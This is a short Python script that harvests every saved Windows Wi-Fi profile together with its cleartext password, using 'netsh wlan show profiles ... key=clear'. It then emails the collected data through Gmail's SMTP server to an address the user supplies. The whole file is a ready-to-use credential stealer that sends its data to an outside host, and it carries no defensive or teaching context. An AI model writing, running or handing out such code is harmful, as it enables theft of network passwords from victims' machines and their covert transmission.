import subprocess
import re
import smtplib

data = ''
command = "netsh wlan show profiles"
networks = subprocess.check_output(command, shell=True)
network_name = re.findall(rb"(?:Profile\s*:\s)(.*)", networks)
# print(network_name[0].decode("utf-8"))

for i in network_name:
    network = i.decode('utf-8')
    command = 'netsh wlan show profiles name=' + \
        '"{}"'.format(network.split('\r')[0]) + ' key=clear'
    result = subprocess.check_output(command, shell=True)
    data += result.decode('utf-8')

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()

# change "your_email_address" to your real email address
#  "gmail-password" to email password

server.login('email', 'gamil-password')
server.sendmail("your-email", "sender-email", data)

server.quit()
print("DOne")
